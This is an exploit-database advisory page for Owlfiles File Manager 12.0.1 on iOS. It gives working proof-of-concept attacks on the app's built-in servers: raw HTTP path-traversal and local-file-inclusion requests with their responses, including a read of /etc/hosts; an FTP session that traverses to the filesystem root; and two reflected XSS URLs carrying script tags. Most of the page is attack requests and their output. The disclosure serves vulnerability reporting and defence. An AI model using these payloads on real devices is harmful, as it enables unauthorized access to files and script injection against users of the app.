---
title: Owlfiles File Manager 12.0.1 Multiple Vulnerabilities
url: https://cxsecurity.com/issue/WLB-2023030059
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-03-28
fetch_date: 2025-10-04T10:49:39.197568
---

# Owlfiles File Manager 12.0.1 Multiple Vulnerabilities

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Owlfiles File Manager 12.0.1 Multiple Vulnerabilities** **2023.03.27**  Credit:  **[Chokri Hammedi](https://cxsecurity.com/author/Chokri%2BHammedi/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-98](https://cxsecurity.com/cwe/CWE-98 "Click to see CWE-98")** | |

# Exploit Title: Owlfiles File Manager 12.0.1 - Multiple Vulnerabilities
# Date: Sep 19, 2022
# Exploit Author: Chokri Hammedi
# Vendor Homepage: https://www.skyjos.com/
# Software Link:
https://apps.apple.com/us/app/owlfiles-file-manager/id510282524
# Version: 12.0.1
# Tested on: iPhone iOS 16.0
###########
path traversal on HTTP built-in server
###########
GET /../../../../../../../../../../../../../../../System/ HTTP/1.1
Host: localhost:8080
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 6\_0 like Mac OS X)
AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e
Safari/8536.25
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
If-None-Match: 42638202/1663558201/177889085
If-Modified-Since: Mon, 19 Sep 2022 03:30:01 GMT
Connection: close
Content-Length: 0
-------
HTTP/1.1 200 OK
Cache-Control: max-age=3600, public
Content-Length: 317
Content-Type: text/html; charset=utf-8
Connection: Close
Server: GCDWebUploader
Date: Mon, 19 Sep 2022 05:01:11 GMT
<!DOCTYPE html>
<html><head><meta charset="utf-8"></head><body>
<ul>
<li><a href="Cryptexes/">Cryptexes/</a></li>
<li><a href="DriverKit/">DriverKit/</a></li>
<li><a href="Library/">Library/</a></li>
<li><a href="Applications/">Applications/</a></li>
<li><a href="Developer/">Developer/</a></li>
</ul>
</body></html>
#############
LFI on HTTP built-in server
#############
GET /../../../../../../../../../../../../../../../etc/hosts HTTP/1.1
Host: localhost:8080
Accept: application/json, text/javascript, \*/\*; q=0.01
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 6\_0 like Mac OS X)
AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e
Safari/8536.25
X-Requested-With: XMLHttpRequest
Referer: http://localhost:8080/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
----
HTTP/1.1 200 OK
Connection: Close
Server: GCDWebUploader
Content-Type: application/octet-stream
Last-Modified: Sat, 03 Sep 2022 01:37:01 GMT
Date: Mon, 19 Sep 2022 03:28:14 GMT
Content-Length: 213
Cache-Control: max-age=3600, public
Etag: 1152921500312187994/1662169021/0
##
# Host Database
#
# localhost is used to configure the loopback interface
# when the system is booting. Do not change this entry.
##
127.0.0.1 localhost
255.255.255.255 broadcasthost
::1 localhost
###############
path traversal on FTP built-in server
###############
ftp> cd ../../../../../../../../../
250 OK. Current directory is /../../../../../../../../../
ftp> ls
200 PORT command successful.
150 Accepted data connection
total 10
drwxr-xr-x 0 root wheel 256 Jan 01 1970 usr
drwxr-xr-x 0 root wheel 128 Jan 01 1970 bin
drwxr-xr-x 0 root wheel 608 Jan 01 1970 sbin
drwxr-xr-x 0 root wheel 224 Jan 01 1970 System
drwxr-xr-x 0 root wheel 640 Jan 01 1970 Library
drwxr-xr-x 0 root wheel 224 Jan 01 1970 private
drwxr-xr-x 0 root wheel 1131 Jan 01 1970 dev
drwxr-xr-x 0 root admin 4512 Jan 01 1970 Applications
drwxr-xr-x 0 root admin 64 Jan 01 1970 Developer
drwxr-xr-x 0 root admin 64 Jan 01 1970 cores
WARNING! 10 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 Transfer complete.
ftp>
#############
XSS on HTTP built-in server
#############
poc 1:
http://localhost:8080/download?path=<script>alert(1)</script>
poc 2:
http://localhost:8080/list?path=<script>alert(1)</script>

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023030059)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top